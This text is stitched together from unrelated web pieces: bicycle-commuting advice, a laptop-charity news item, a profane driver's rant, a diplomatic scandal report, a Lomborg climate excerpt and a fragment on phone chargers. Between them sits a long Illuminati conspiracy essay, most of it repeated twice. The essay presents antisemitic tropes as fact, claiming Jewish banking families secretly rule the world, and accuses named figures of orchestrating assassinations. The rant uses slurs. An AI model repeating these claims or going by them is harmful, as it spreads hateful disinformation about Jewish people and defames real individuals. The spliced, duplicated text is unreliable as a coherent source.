I typically travel at about 11 - 18 mph .
Although I have a right to the road , I try to let faster vehicles have their way , eventually .
There are many websites that discuss strategies for how to share the road with motorists , such as Trailnet and the Bicycle Federation of Wisconsin ( or see here , here or here )
Before assuming you know how to ride a bicycle in traffic , it is critically important to review the information on websites like these .
I do n’t mean to frighten anyone away with the dangers of cycling .
After all driving a car is dangerous , as is crossing a street on foot .
When you get into good habits , they tend to take care of you .
One of the main ways to be safe is to plan routes that avoid heavy traffic .
You ’ll find that you can ride your bicycle as fast ( or faster ) using side streets rather than those congested main roads .
I highly recommend this strategy .
Here are more tips on planning your route )
In my opinion , one of the most important ways of being safe on a bicycle is to avoid traveling during the middle of rush hour .
Something happens to the brains of motorists during rush hour .
They become obsessed with getting where they ’re trying to go , picking up their kids , making dinner , everyone else be damned .
You ’ll find cars cutting in and out and otherwise driving aggressively .
You ’ll also find that there ’s more exhaust out there in rush hour ; it ’s both annoying and harmful to your health .
You ’ll avoid all of these problems if you can stagger your ride to avoid the peak of rush hour and to choose a route that avoids the main roads .
Here ’s another advantage of riding a bike to work : you can become an amateur anthropologist .
When you get on the elevator on your way up to your office , the well - dressed people will glance at you wearing your bike clothing and helmet .
They sometimes treat you with some condescension because they assume that you ’re the delivery guy .
These are the same people on the same elevators that will treat me as an equal when I ’m wearing a suit .
By the way , the janitorial staff and other hourly workers will often find you to be more accessible than when you ’re wearing your real business clothes and strike up some enjoyable conversation with you .
If you ’ve got children , you might still be able to bicycle commuting into your life .
When my two children were very young , I pulled them to their preschool in a bike trailer designed for that very purpose ( I used a Burley trailer , though there are other good brands too ) .
It was a 2 - mile commute and it only took a little bit longer than riding without the trailer .
Now that my kids are older , I still have that bike trailer , which I use for hauling groceries home ( the grocery store is only about 2 miles away , which amounts to a 12 - minute ride each way ) .
I ’ve often cycled home from the produce market loaded with two huge watermelons and other produce .
You ’ll amaze yourself with the amount of groceries you can fit into a trailer ( unless , of course your children are strapped in ! ) .
I still have a car and it is often indispensable .
As you can tell , though , the bicycle has worked well for me .
I am amazed at how often a bicycle can get me from here to there quickly , cheaply and with free exercise built - in .
My children are now aged seven and nine , and they are starting to build up some good stamina .
This will only increase the number of troops that are feasible by bicycle ( they seem to enjoy trips of up to 3 - miles each way , and they ’re getting more ambitious each month ) .
The bottom line ?
There are millions of you out there who would benefit from bicycle commuting .
Not only would you benefit form the freedom of biking .
You will probably never go back to commuting by motor vehicle .
Who Are The Illuminati ?
By Richard Stone |
" A loose affiliation of millionaires and billionaires " ( Paul Simon ) .
" The world is governed by far different personages from what is imagined by those who are not behind the scenes " ( Benjamin Disraeli ) .
" Give me control over a nation 's currency , and I care not who makes the laws " ( Mayer Rothschild ) .
The Rothschilds The Rothschilds Conspiracy theory is the theory that most of the world is secretly governed by a small group of men who operate behind the scenes .
Conspiracy theory is now an accepted turn of phrase but sometimes one hears the expression , sometimes whispered rather than spoken .
" The Illuminati " .
What does this mean ?
Who are the Illuminati ?
They are , in essence , a cartel of international bankers and industrialists based in Western Europe and North America .
The names of certain families persist over long periods of time .
Some of the most important names are Rothschild , Rockefeller , Morgan , Lazard , Warburg , Schroder and Schiff .
The pivotal family is probably the house of Rothschild , the descendants of Mayer Rothschild ( 1743 - 1812 ) of Frankfurt .
The male descendants of this family , for at least two generations , generally married first cousins or even nieces .
The family established banking institutions in Vienna , London , Naples and Paris as well as Frankfurt .
Ever since the middle ages , these families have been building their power by lending money at rates of interest to the monarchies and governments of Europe who were forever in debt , particularly in times of war .
Sooner than tax the population to raise funds , always an unpopular measure , they usually preferred to borrow money from the money - lenders .
This was the birth of the concept " the national debt . "
The countries of the world are forever in debt but where there is a debtor there is a creditor - who is this money owed to ?
It is owed to this coterie of international bankers .
By the nineteenth century the power of the Rothschild family was immense .
They increased their wealth with great cunning and cleverness , while maintaining a low public profile .
A notable example of their methods was their exploitation of the battle of Waterloo .
The Rothschilds had spies watching the course of the battle and as soon as became evident that Wellington had won , a Rothschild agent traveled at maximum speed to London , arriving hours before Wellington 's own messenger .
Rothschild received the messenger and began conspicuously selling his stocks .
The whole stock exchange assumed that Wellington had lost and Napoleon had won so everybody started selling , at this point , other Rothschild agents bought up huge stocks at give - away prices .
Thus an already massive fortune was massively increased .
The Rockefeller family may be equally important .
The pivotal figure in this family was J.D. Rockefeller , who made his fortune out of Standard Oil or Esso in Ohio and Pennsylvania .
He also controlled the railroads .
When rival road transport systems were established he attempted to block them by parking his trains across the roads at level crossings .
His basic business technique was the elimination of competitors at all costs , followed by the establishment of a monopoly , followed by profit taking .
He rapidly gained a name for huge wealth , secrecy and hard and dirty business practice .
In his later years he had a harsh and gaunt appearance , so to counter his bad " public image " JD more or less invented the PR industry .
He had short films of himself made , calculated to charm the public , himself playing golf with a pretty little child for instance .
This film was shown on TV recently .
It has a rather false and amateurish air but was very effective with the public of the day .
The Rockerfellers currently have controlling interests in Exxon ( the world 's biggest company ) and the Chase Manhattan Bank , which turns over trillions of dollars a week .
With so many billions in their hands already , what does more money mean ?
Obviously it means more power and more control over other human beings , but to what end and in whose name ?
Apparently in the name of Lucifer , the fallen angel also known as the bringer of light , hence the name " Illuminati " , which means " the enlightened ones " .
Lucifer is also known for the characteristics of pride , deception and impermanence .
The illuminati were apparently founded in Bavaria in 1770 [ 1776 ] by one Adam Weisshaupt , a student of the Jewish philosopher Mendelsohn , and backed by the Rothschild family .
The society has always been based on the lodges of Freemasonry , which was taken over at the highest levels during the course of the eighteenth century by agents of the Illuminati .
Freemasonry is a very secretive institution , to the extent that members at one level do not know what members at another level are doing .
Hence it is an organisation which is full of bonhomie and good deeds at the lower and middle levels , while its motives and deeds at the highest levels veer towards the dark side .
Both Freemasonry and Judaism have strong roots in the ancient Egyptian systems of religious belief , and it was this very similarity which attracted the illuminati to Freemasonry , for most of them were Jewish .
It is a source of controversy today to speculate whether or not they are still predominantly Jewish .
No unfair racism intended - they either are or they are n't .
Certainly there is much evidence to suggest that they are not , George Bush for instance , a prominent illuminati figure and obviously not Jewish .
The all seeing eye on the U.S. Dollar Bill
The United States of America is more or less a creation of Freemasonry .
The symbol of Freemasonry was placed on the cornerstone of the Whitehouse , while the assembled Freemasons lodges stood and watched the ceremony .
The famous all - seeing eye in the pyramid appears on the one dollar bill .
It is one of the main symbols of Freemasonry .
This bill also bears the inscription , in Latin , " 1776 , the year of inception of a new world order " .
If one joins the dots formed by the stars of the thirteen original states one obtains an exact Star of David .
The goal of the IlIuminati is total control of the world .
The only nations , which are holding out against their power , are some Islamic nations and China but this resistance is limited because the Illuminati have crushing economic power .
There are certain methods of subjugation and control which are indispensable to this power .
The first is , of course , complete control over all financial systems , all borrowing and lending .
All banks , all building societies , all insurance companies have to be under their control .
At the lowest level even the smallest bank will be forced to toe the line .
At the highest level the World Bank decides the fate of countries .
It is an interesting and amazing fact that both the Federal Reserve Bank and the Bank of England are controlled by these Illuminati dynasties , in spite of the names of these banks , which suggest that they are run for public benefit .
It is said that both Abraham Lincoln and John Kennedy wanted to change this system .
The second essential component is control of the media .
It is controlled through business fashion .
If the board meeting , or the management meeting , or the sales meeting , or the training meeting suggests that facts should be presented in a certain way , who is going to present them differently ?
There is an implied threat to one 's job and one 's career .
Few people would gladly face demotion , retrenchment or the dole and most people are so ambitious they will do nearly anything " reasonable " to court favour with their superiors .
This is how business is controlled and the media is the most important part of business , for it controls people 's minds .
People are very suggestible and often lend more credence to what they see on " the box " than to what happens on their own street .
The Illuminati know this and use this suggestibility factor to the full .
Lenin's key move during the Russian revolution was the capture of the radio station .
The third factor in the control system is the universities , and through them the whole education system .
Particular effort is put into the schools of sociology , politics , economics and education , hence " liberal " systems of education which are often degenerate and even violent .
Their men are inserted into the universities through the power of funding by big business .
They then spread their influence downwards through tertiary to secondary and primary education .
The fourth factor is the enormous influence wielded by two similar organisations , The Council of Foreign Relations in the USA and the Royal Institute of International Affairs in England .
These institutions are schools for statesmen , Illuminati statesmen .
They are the stamping grounds of men such as Henry Kissinger , Zbigniew Brzezinksi and Lord Carrington .
These two " think tanks " have a crucial influence on all US and British governments , no matter which party is " in power " .
The statesmen produced by these institutions can and do decide the fate of nations .
The tax - exempt foundations are also instruments of Illuminati power .
The Ford foundation and the Rockefeller foundation are two prominent examples of this type of " charitable " institution .
They were heavily involved in supporting various communist powers when the cold war was at its height .
Communism versus capitalism arms race = more money and power for the Illuminati .
So these are some of the structures through which the Illuminati work but what methods do they use ?
Pitting one side against the other , using a theory devised by Hegel , which is :
Thesis versus antitheses - synthesis .
Every force tends to have an opposite counterforce .
The conflict between the two results in a new situation , the synthesis .
The illuminati make it their business to be the synthesis .
Thus no problem situation is ever " nipped in the bud " it is rather fostered and used , just as the Soviet Union was fostered and used .
The insertion of immigrant groups into countries is a variation of this divide and rule process .
Each group can be played off against the other .
" Double talk " and " double think " .
George Orwell knew instinctively what was going on when he invented these two expressions :
I categorically deny = it will happen a bit later .
Peace = war by another means .
To say one thing and do another is fundamental to Illuminati practice .
They believe that the public will accept these lies through laziness and wishful thinking .
Unfortunately they are usually correct .
" Keep them busy busy busy , back on the farm with the other animals . "
We are kept so busy with business ( or busyness ) that we do not understand or participate in the decisions and events that will crucially affect our future .
When a real power move is made it is usually done secretly and suddenly often with the pretence that nothing has happened .
There is preparation for opposition , but conflict is often not necessary as most people have been trained to be so passive that they will probably not create an effective opposition .
Use of front men in important positions .
These front men have the characteristic of " servile obedience " , probably because of a blot or blots on their character which they are anxious to conceal .
Most of the Presidents of the USA fall into this category .
The current situation springs to mind .
Behind the opponent stands the man with real power , who has long been groomed for this position .
Men like Henry Kissinger , Zbigniew Brzezinski and George Bush are in this category .
The assassination of opposing leaders as quietly and as secretly as possible , so as to simulate a natural death .
If this is not possible due to time constraints or other limited circumstances , surrogates are used and the lines of suspicion are covered by deception , false accusation and if necessary , multiple assassinations .
Induced heart attacks , fake motor accidents and apparent suicides are also favoured methods of assassination .
Social engineering .
An easily manipulated rabble is what is required .
Mixed population groups with weak morals , weak traditions , low educational standards and weak group willpower are the aim .
Those with special aptitudes can be taken out and trained to serve the illuminati for technical purposes , security purposes or as part of the propaganda apparatus .
The middle class will become surplus to requirements and will be reduced to relative poverty .
Mockery and submission of the manners and morals of societies which show any resistance .
Control of the media , the fashion industries and the education systems are essential components in this strategy .
" Free love " , the cult of youth , mockery of the Christian and Muslim faiths also fall into this category .
" I do n't give a rats ass about Jesus Christ " is one recent masterpiece from one of Hollywood 's biggest starts .
He probably did n't realise what he was saying , which makes him a " useful idiot ' .
A " useful idiot " is much more effective than a conscious supporter .
By these means of subversion societies and nations are conquered from within and open battle is usually not necessary .
The conduct of unrelenting economic warfare .
This is the real war and continues even while the bombs are falling and the bullets are flying .
The important part is the control of the enemy 's economy after the conflict .
The recent economic crash in the far - eastern countries is in reality an assertion of the Illuminati's economic power , an expression of economic dominance .
The Illuminati now control 10 - 15 % of the Japanese economy .
This is public knowledge , that is what has been bought at bargain prices .
In reality they probably control much more .
Control and exploitation of the standards of public health .
The sale of prescription drugs is a huge business generating mega profits .
Medical operations and treatments can also be very profitable to big business .
These extreme treatments have their place but are over - used for the sake of profit .
In fact big business , particularly the big drug companies , have a vested interest in the ill health of the population .
These companies , working through the US Food and Drug Administration , have tried to suppress the health food industry .
In this they have largely failed but now the game is to own it and control it so that health foods can only be afforded by the elite .
Argument through defamation of character .
The factual debate is ignored while characters are defamed .
This is usually a very effective technique as many human beings are very suggestible and seem reluctant to use their reasoning abilities .
Thus a " smear campaign " can easily draw attention away from the facts .
To conclude , it is growing increasingly evident that a world government is developing , and many would say that it is probably no bad thing , but few have asked for what purpose this " new world order " is created .
Nor have they asked themselves what the consequences will be .
These consequences ( or some of them ) will probably be as follows :
 Increasing profits for big business , increasing poverty for the middle class ( who they despise ) .
A rapid decline in moral standards and the promotion of social decay .
 Transience .
Jobs that do n't last ; neighbourhoods that do n't last .
 Increasing levels of crime and violence .
 Decline and demise of public services ; replacement by private enterprise - good service for the few who can afford it .
 Ongoing ill health for the bulk of the population because of stress ; poor quality foods ; food additives ; genetic engineering ; pollution and drugs .
There may be good health for those who can afford it - only the rich and well informed .
 The gradual phasing out of national governments , which will have powers more like the regional governments of today .
 The formation of several conglomerations like the United States .
In time a world leader will be announced , a real one this time .
A pity he will have a cynical contempt for the most of humanity .
Do we deserve it ?

The pivotal figure in this family was J.D. Rockefeller , who made his fortune out of Standard Oil or Esso in Ohio and Pennsylvania .
He also controlled the railroads .
When rival road transport systems were established he attempted to block them by parking his trains across the roads at level crossings .
His basic business technique was the elimination of competitors at all costs , followed by the establishment of a monopoly , followed by profit taking .
He rapidly gained a name for huge wealth , secrecy and hard and dirty business practice .
In his later years he had a harsh and gaunt appearance , so to counter his bad " public image " JD more or less invented the PR industry .
He had short films of himself made , calculated to charm the public , himself playing golf with a pretty little child for instance .
This film was shown on TV recently .
It has a rather false and amateurish air but was very effective with the public of the day .
The Rockerfellers currently have controlling interests in Exxon ( the world 's biggest company ) and the Chase Manhattan Bank , which turns over trillions of dollars a week .
With so many billions in their hands already , what does more money mean ?
Obviously it means more power and more control over other human beings , but to what end and in whose name ?
Apparently in the name of Lucifer , the fallen angel also known as the bringer of light , hence the name " Illuminati " , which means " the enlightened ones " .
Lucifer is also known for the characteristics of pride , deception and impermanence .
The illuminati were apparently founded in Bavaria in 1770 [ 1776 ] by one Adam Weisshaupt , a student of the Jewish philosopher Mendelsohn , and backed by the Rothschild family .
The society has always been based on the lodges of Freemasonry , which was taken over at the highest levels during the course of the eighteenth century by agents of the Illuminati .
Freemasonry is a very secretive institution , to the extent that members at one level do not know what members at another level are doing .
Hence it is an organisation which is full of bonhomie and good deeds at the lower and middle levels , while its motives and deeds at the highest levels veer towards the dark side .
Both Freemasonry and Judaism have strong roots in the ancient Egyptian systems of religious belief , and it was this very similarity which attracted the illuminati to Freemasonry , for most of them were Jewish .
It is a source of controversy today to speculate whether or not they are still predominantly Jewish .
No unfair racism intended - they either are or they are n't .
Certainly there is much evidence to suggest that they are not , George Bush for instance , a prominent illuminati figure and obviously not Jewish .
The all seeing eye on the U.S. Dollar BillThe United States of America is more or less a creation of Freemasonry .
The symbol of Freemasonry was placed on the cornerstone of the Whitehouse , while the assembled Freemasons lodges stood and watched the ceremony .
The famous all - seeing eye in the pyramid appears on the one dollar bill .
It is one of the main symbols of Freemasonry .
This bill also bears the inscription , in Latin , " 1776 , the year of inception of a new world order " .
If one joins the dots formed by the stars of the thirteen original states one obtains an exact Star of David .
The goal of the IlIuminati is total control of the world .
The only nations , which are holding out against their power , are some Islamic nations and China but this resistance is limited because the Illuminati have crushing economic power .
There are certain methods of subjugation and control which are indispensable to this power .
The first is , of course , complete control over all financial systems , all borrowing and lending .
All banks , all building societies , all insurance companies have to be under their control .
At the lowest level even the smallest bank will be forced to toe the line .
At the highest level the World Bank decides the fate of countries .
It is an interesting and amazing fact that both the Federal Reserve Bank and the Bank of England are controlled by these Illuminati dynasties , in spite of the names of these banks , which suggest that they are run for public benefit .
It is said that both Abraham Lincoln and John Kennedy wanted to change this system .
The second essential component is control of the media .
It is controlled through business fashion .
If the board meeting , or the management meeting , or the sales meeting , or the training meeting suggests that facts should be presented in a certain way , who is going to present them differently ?
There is an implied threat to one 's job and one 's career .
Few people would gladly face demotion , retrenchment or the dole and most people are so ambitious they will do nearly anything " reasonable " to court favour with their superiors .
This is how business is controlled and the media is the most important part of business , for it controls people 's minds .
People are very suggestible and often lend more credence to what they see on " the box " than to what happens on their own street .
The Illuminati know this and use this suggestibility factor to the full .
Lenin's key move during the Russian revolution was the capture of the radio station .
The third factor in the control system is the universities , and through them the whole education system .
Particular effort is put into the schools of sociology , politics , economics and education , hence " liberal " systems of education which are often degenerate and even violent .
Their men are inserted into the universities through the power of funding by big business .
They then spread their influence downwards through tertiary to secondary and primary education .
The fourth factor is the enormous influence wielded by two similar organisations , The Council of Foreign Relations in the USA and the Royal Institute of International Affairs in England .
These institutions are schools for statesmen , Illuminati statesmen .
They are the stamping grounds of men such as Henry Kissinger , Zbigniew Brzezinksi and Lord Carrington .
These two " think tanks " have a crucial influence on all US and British governments , no matter which party is " in power " .
The statesmen produced by these institutions can and do decide the fate of nations .
The tax - exempt foundations are also instruments of Illuminati power .
The Ford foundation and the Rockefeller foundation are two prominent examples of this type of " charitable " institution .
They were heavily involved in supporting various communist powers when the cold war was at its height .
Communism versus capitalism arms race = more money and power for the Illuminati .
So these are some of the structures through which the Illuminati work but what methods do they use ?
Pitting one side against the other , using a theory devised by Hegel , which is :
Thesis versus antitheses - synthesis .
Every force tends to have an opposite counterforce .
The conflict between the two results in a new situation , the synthesis .
The illuminati make it their business to be the synthesis .
Thus no problem situation is ever " nipped in the bud " it is rather fostered and used , just as the Soviet Union was fostered and used .
The insertion of immigrant groups into countries is a variation of this divide and rule process .
Each group can be played off against the other .
" Double talk " and " double think " .
George Orwell knew instinctively what was going on when he invented these two expressions : I categorically deny = it will happen a bit later .
Peace = war by another means .
To say one thing and do another is fundamental to Illuminati practice .
They believe that the public will accept these lies through laziness and wishful thinking .
Unfortunately they are usually correct .
" Keep them busy busy busy , back on the farm with the other animals . "
We are kept so busy with business ( or busyness ) that we do not understand or participate in the decisions and events that will crucially affect our future .
When a real power move is made it is usually done secretly and suddenly often with the pretence that nothing has happened .
There is preparation for opposition , but conflict is often not necessary as most people have been trained to be so passive that they will probably not create an effective opposition .
Use of front men in important positions .
These front men have the characteristic of " servile obedience " , probably because of a blot or blots on their character which they are anxious to conceal .
Most of the Presidents of the USA fall into this category .
The current situation springs to mind .
Behind the opponent stands the man with real power , who has long been groomed for this position .
Men like Henry Kissinger , Zbigniew Brzezinski and George Bush are in this category .
The assassination of opposing leaders as quietly and as secretly as possible , so as to simulate a natural death .
If this is not possible due to time constraints or other limited circumstances , surrogates are used and the lines of suspicion are covered by deception , false accusation and if necessary , multiple assassinations .
Induced heart attacks , fake motor accidents and apparent suicides are also favoured methods of assassination .
Social engineering .
An easily manipulated rabble is what is required .
Mixed population groups with weak morals , weak traditions , low educational standards and weak group willpower are the aim .
Those with special aptitudes can be taken out and trained to serve the illuminati for technical purposes , security purposes or as part of the propaganda apparatus .
The middle class will become surplus to requirements and will be reduced to relative poverty .
Mockery and submission of the manners and morals of societies which show any resistance .
Control of the media , the fashion industries and the education systems are essential components in this strategy .
" Free love " , the cult of youth , mockery of the Christian and Muslim faiths also fall into this category .
" I do n't give a rats ass about Jesus Christ " is one recent masterpiece from one of Hollywood 's biggest starts .
He probably did n't realise what he was saying , which makes him a " useful idiot ' .
A " useful idiot " is much more effective than a conscious supporter .
By these means of subversion societies and nations are conquered from within and open battle is usually not necessary .
The conduct of unrelenting economic warfare .
This is the real war and continues even while the bombs are falling and the bullets are flying .
The important part is the control of the enemy 's economy after the conflict .
The recent economic crash in the far - eastern countries is in reality an assertion of the Illuminati's economic power , an expression of economic dominance .
The Illuminati now control 10 - 15 % of the Japanese economy .
This is public knowledge , that is what has been bought at bargain prices .
In reality they probably control much more .
Control and exploitation of the standards of public health .
The sale of prescription drugs is a huge business generating mega profits .
Medical operations and treatments can also be very profitable to big business .
These extreme treatments have their place but are over - used for the sake of profit .
In fact big business , particularly the big drug companies , have a vested interest in the ill health of the population .
These companies , working through the US Food and Drug Administration , have tried to suppress the health food industry .
In this they have largely failed but now the game is to own it and control it so that health foods can only be afforded by the elite .
Argument through defamation of character .
The factual debate is ignored while characters are defamed .
This is usually a very effective technique as many human beings are very suggestible and seem reluctant to use their reasoning abilities .
Thus a " smear campaign " can easily draw attention away from the facts .
To conclude , it is growing increasingly evident that a world government is developing , and many would say that it is probably no bad thing , but few have asked for what purpose this " new world order " is created .
Nor have they asked themselves what the consequences will be .
These consequences ( or some of them ) will probably be as follows : 
Increasing profits for big business , increasing poverty for the middle class ( who they despise ) .
A rapid decline in moral standards and the promotion of social decay .
Transience .
Jobs that do n't last ; neighbourhoods that do n't last .
Increasing levels of crime and violence .
Decline and demise of public services ; replacement by private enterprise - good service for the few who can afford it .
Ongoing ill health for the bulk of the population because of stress ; poor quality foods ; food additives ; genetic engineering ; pollution and drugs .
There may be good health for those who can afford it - only the rich and well informed .
The gradual phasing out of national governments , which will have powers more like the regional governments of today .
The formation of several conglomerations like the United States .
In time a world leader will be announced , a real one this time .
A pity he will have a cynical contempt for the most of humanity .
Do we deserve it ?

And he is reaching out to the public to try to give the laptop campaign a boost .
The marketing program , to be announced today , is called “ Give 1 Get 1 , ” in which Americans and Canadians can buy two laptops for $ 399 .
Image A childrens laptop , equipped with a camera and wireless communication ability .
One of the machines will be given to a child in a developing nation , and the other one will be shipped to the purchaser by Christmas .
The donated computer is a tax - deductible charitable contribution .
The program will run for two weeks , with orders accepted from Nov. 12 to Nov. 26 .
Just what Americans will do with the slender green - and - white laptops is uncertain .
Some people may donate them to local schools or youth organizations , said Walter Bender , president of the laptop project , while others will keep them for their own family or their own use .
The machines have high - resolution screens , cameras and peer - to - peer technology so the laptops can communicate wirelessly with one another .
The machine runs on free , open source software .
“ Everything in the machine is open to the hacker , so people can poke at it , change it and make it their own , ” said Mr. Bender , a computer researcher .
“ Part of what we ’re doing here is broadening the community of users , broadening the base of ideas and contributions , and that will be tremendously valuable . ”
The machine , called the XO Laptop , was not engineered with affluent children in mind .
It was intended to be inexpensive , with costs eventually approaching $ 100 a machine , and sturdy enough to withstand harsh conditions in rural villages .
It is also extremely energy efficient , with power consumption that is 10 percent or less of a conventional laptop computer .

I expect the worst from Colorado drivers and I am rarely disappointed .
I have been reading about road rage on Craig ’s List and I do have a few pointed observations .
If people are honking , flashing their lights and shaking their fists at you perhaps you should reevaluate some of your driving habits .
Here are a few pointers .
When sitting at a red light please do n’t redo your makeup , read a newspaper , change your clothes , masturbate , give head to your passenger , allow your passenger to give YOU head or begin distracting activities that may cause you to be otherwise occupied when the light turns green .
When the light actually turns green there should n’t be a deliberative process necessary before you STEP ON THE GAS .
The roads are overcrowded as it is and all it takes is a couple of retards sitting and staring at a green light for 15 or 20 seconds to start a chain reaction behind them that leads to what we call VOLUME SLOWING .
If you are in the left lane and you want to drive at a leisurely pace , I understand .
GET IN THE RIGHT LANE .
This is the lane for slower traffic .
If you are driving in the left lane and you are dead even with the guy in the right lane , YOU ARE FUCKING UP .
There are people behind you with appointments to keep , jobs to go to or who may have an urgent need to use the bathroom .
Please move to the right and let them get about their business .
I do n’t know how many times I ’ve had to sit and listen to my fare grind his or her teeth because there are three flaming A - holes side by side leisurely driving down the road 15 or 20 miles below the speed limit .
MERGE RIGHT ASS HAT !
My meter is running and you are COSTING MY PASSENGER MONEY .
Some of the people passing you may exceed the speed limit in doing so .
This is perfectly legal but even if it was n’t please remember , YOU ARE NOT A LAW ENFORCEMENT OFFICER .
We have paid professionals who are perfectly capable of enforcing the law and YOU ARE NOT ONE OF THEM .
By intentionally slowing traffic you ARE BREAKING THE LAW and may be ticketed for this violation .
If you are in the right lane and someone in the left lane is signaling to get over LET UP ON THE GAS .
I do n’t know how many times I have put on my signal for thirty or forty seconds and tried to merge right only to experience a blaring horn and upraised finger from some retard who has been pacing me in my blind spot for the last mile or two .
Just for the record , this is why so many people fail to signal turns and “ cut you off ” .
They know that as soon as you see the turn signal you will probably sit your passive aggressive ass directly in the way and stay there for as long as possible .
About being “ cut off ” .
The only people who are “ cut off ” are those who REFUSE TO YIELD .
You do not own the road and must share it with about a million other drivers .
Get good with this fact or move out to Busted Dick Colorado where your driving wo n’t raise eyebrows and tempers .
There are other distractions that interfere with the flow of traffic that you should learn to deal with in a mature and proactive fashion like accidents .
Accidents happen but unless you are a medical professional who is slowing down in order to stop and render aid KEEP MOVING .
I ’m not advocating blasting through police diversions at 60 miles an hour but there is no need to slow down to a crawl when passing an accident , RUBBERNECK’S CAUSE ADDITIONAL ACCIDENTS so if you and your voyeur family do n’t want to become a part of the roadside tragedy you are gaping at , GET A MOVE ON .
The same goes for other roadside diversions including break downs , pretty girls getting ticketed , accidents on THE OTHER SIDE OF THE STREET , emergency vehicles going in the opposite direction on a divided road and related events ,
If you are driving in the mountains and you see that there are 20 or 30 people piled up behind you , PULL OFF TO THE SIDE OF THE ROAD AND LET THEM PASS .
Sooner or later it ’s going to snow .
For those of you with no winter driving experience snow is the white stuff that falls from the sky .
IT IS FROZEN WATER and is often quite slippery .
THIS IS THE TIME TO SLOW DOWN.
GET IN THE RIGHT LANE and let the people who want to drive fast do so , For those of you who own vehicles with 4 - wheel drive , great !
4 - wheel drive will give you great traction in the snow BUT IT WILL NOT HELP YOU STOPPING !
I do n’t know how many times I have been passed in a blizzard by shiny 4 - wheel drive vehicles going 30 or 40 miles an hour over the safe limit for driving only to see them piled into a bridge abutment a mile or so up the road .
Clearly if you ’ve just polished off a 12 pack you should be riding with me .
We all have cell phones nowadays .
If you have one , get a headset , you need both hands to drive .
If you ’re having an argument with your sweetie , PULL OVER and finish it in a parking lot instead of the middle of an intersection .
In conclusion .
I do n’t care what kind of self - absorbed butt nugget you are in the rest of your life please remember that you are piloting a couple of tons of metal glass and plastic around the road .
Try to rise above your vile self just long enough to get from A to B without pissing every other driver on earth off and we ’ll all be a lot happier and some of us may live a little longer .
Thank you in advance for your fine cooperation .
Israel 's leadership has been shaken by a string of scandals
Reports say he was able to identify himself to police only after a rubber ball had been removed from his mouth .
A foreign ministry official described Ambassador Tzuriel Refael 's behaviour as an unprecedented embarrassment .
The incident , which happened two weeks ago , has renewed calls for a radical overhaul of the way Israel appoints and promotes its diplomats .
San Salvador was Mr Refael 's first post as ambassador .
He was promoted in 2006 from a technical position in the ministry which had involved several foreign postings .
We 're talking about behaviour that is unbecoming of a diplomat
Foreign ministry spokeswoman
She confirmed that lurid reports of the incident in the Israeli press were accurate .
" We 're talking about behaviour that is unbecoming of a diplomat , " she said .
Israel has been rocked by a recent series of misconduct and corruption scandals , shaking public confidence in the political leadership .
Haaretz website reports that police found Mr Refael in the Israeli embassy compound where he had been found bound , gagged and naked apart from sado - masochistic sex accessories .
In 2006 , Israel 's diplomatic service was criticised by the public watchdog for its appointments system .
The state comptroller 's report singled out the foreign ministry appointments committee for its inadequate examination of candidates and lack of transparency .
Yes , Bjorn Lomborg , the controversial Danish economist , believes that “ global warming is real and man-made . ”
But he is convinced that we are not thinking the problem through correctly and are , in fact , lost in a kind of green fog about how best to deal with global warming and other major environmental threats .
In this excerpt from his new book , Cool It , Lomborg illustrates how a major climate - related killer goes underreported , while human deaths from heat waves make front - page news .
The heat wave in Europe in early August 2003 was a catastrophe of heartbreaking proportions .
With more than 3,500 dead in Paris alone , France suffered nearly 15,000 fatalities from the heat wave .
Another 7,000 died in Germany , 8,000 in Spain and Italy , and 2,000 in the United Kingdom :
The total death toll ran to more than 35,000 .
Understandably , this event has become a psychologically powerful metaphor for the frightening vision of a warmer future and our immediate need to prevent it .
The green group Earth Policy Institute , which first totaled the deaths , tells us that as “ awareness of the scale of this tragedy spreads , it is likely to generate pressure to reduce carbon emissions .
For many of the millions who suffered through these record heat waves and the relatives of the tens of thousands who died , cutting carbon emissions is becoming a pressing personal issue . ”
While 35,000 dead is a terrifyingly large number , all deaths should in principle be treated with equal concern .
Yet this is not happening .
When 2,000 people died from heat in the United Kingdom , it produced a public outcry that is still heard .
However , the BBC recently ran a very quiet story telling us that deaths caused by cold weather in England and Wales for the past years have hovered around 25,000 each winter , casually adding that the winters of 1998 – 2000 saw about 47,000 cold deaths each year .
The story then goes on to discuss how the government should make the cost of winter fuel economically bearable and how the majority of deaths are caused by strokes and heart attacks .
It is remarkable that a single heat - death episode of 35,000 from many countries can get everyone up in arms , whereas cold deaths of 25,000 to 50,000 a year in just a single country pass almost unnoticed .
Of course , we want to help avoid another 2,000 dying from heat in the United Kingdom .
But presumably we also want to avoid many more dying from cold .
For Europe as a whole , about 200,000 people die from excess heat each year .
However , about 1.5 million Europeans die annually from excess cold .
That is more than seven times the total number of heat deaths .
Just in the past decade , Europe has lost about 15 million people to the cold , more than 400 times the iconic heat deaths from 2003 .
That we so easily neglect these deaths and so easily embrace those caused by global warming tells us of a breakdown in our sense of proportion .
How will heat and cold deaths change over the coming century with global warming ?
Let us for the moment assume — very unrealistically — that we will not adapt at all to the future heat .
Still , the biggest cross-European cold / heat study concludes that for an increase of 3.6 degrees Fahrenheit in the average European temperatures , “ our data suggest that any increases in mortality due to increased temperatures would be outweighed by much larger short - term declines in cold - related mortalities . ”
For Britain , it is estimated a 3.6 °F increase will mean 2,000 more heat deaths but 20,000 fewer cold deaths .
Likewise , another paper incorporating all studies on this issue and applying them to a broad variety of settings in both developed and developing countries found that “ global warming may cause a decrease in mortality rates , especially of cardiovascular diseases . ”
But of course , it seems very unrealistic and conservative to assume that we will not adapt to rising temperatures throughout the 21st century .
Several recent studies have looked at adaptation in up to 28 of the biggest cities in the United States .
Take Philadelphia .
The optimal temperature seems to be about 80 °F .
In the 1960s , on days when it got significantly hotter than that ( about 100 °F ) , the death rate increased sharply .
Likewise , when the temperature dropped below freezing , deaths increased sharply .
Yet something great happened in the decades following .
Death rates in Philadelphia and around the country dropped in general because of better health care .
But crucially , temperatures of 100 °F today cause almost no excess deaths .
However , people still die more because of cold weather .
One of the main reasons for the lower heat susceptibility is most likely increased access to air - conditioning .
Studies seem to indicate that over time and with sufficient resources , we actually learn to adapt to higher temperatures .
Consequently we will experience fewer heat deaths even when temperatures rise .

Phone chargers - the truth
How much is inside a phone charger ?
One of the greatest dangers to society is the phone charger .
The BBC news has been warning us of this since 2005 : ' The nuclear power stations will all be switched off in a few years .
How can we keep Britain 's lights on ?
... unplug your mobile - phone charger when it 's not in use . '
Sadly , a year later , Britain had n't got the message .
' Britain tops energy waste league ' - and how did this come about ?
